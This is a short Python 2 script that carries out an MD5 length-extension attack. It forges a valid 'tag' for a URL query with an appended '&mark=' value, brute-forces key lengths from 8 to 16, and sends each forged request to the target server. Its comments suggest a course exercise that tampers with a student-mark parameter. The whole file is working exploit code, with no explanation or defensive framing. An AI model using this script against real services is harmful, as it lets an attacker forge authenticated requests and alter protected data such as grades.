import httplib, urlparse, urllib, sys
from md5p import md5, padding

url = sys.argv[1]
mark_value = sys.argv[2]

# parameter url is the attack url you construct 
parsedURL = urlparse.urlparse(url)

params = parsedURL.query.split('&')
# retrieve the actual hased value : e.g. stnum=991234567&asn=1
query = params[1] +"&" + params[2]

# open a connection to the server
httpconn = httplib.HTTPSConnection(parsedURL.hostname)

# get the hash value
tag = params[0][4:]
# get the new hash value by setting internal state to the previous hash value
h = md5(state=tag.decode("hex"), count=512)
mark = "&mark=" + mark_value
h.update(mark)
new_tag =  h.hexdigest()

# loop through all possible key lengths from 8 to 16
for key_len in range(8, 17):
   # expected length of paddings 
   # (by subtracting existing key, previous query and the "&" after "tag" from 512
   length = 512 - len(query)*8 - key_len*8 - 8
   
   update_query = "tag=" + str(new_tag) + "&" + query + urllib.quote(padding(length)) + mark

   # issue server-API request
   httpconn.request("GET", parsedURL.path + "?" + update_query)
   
   # httpresp is response object containing a status value and possible message
   httpresp = httpconn.getresponse()
   
   # valid request will result in httpresp.status value 200
   if httpresp.status == 200:
      print httpresp.status
      # in the case of a valid request, print the server's message
      print httpresp.read()
      
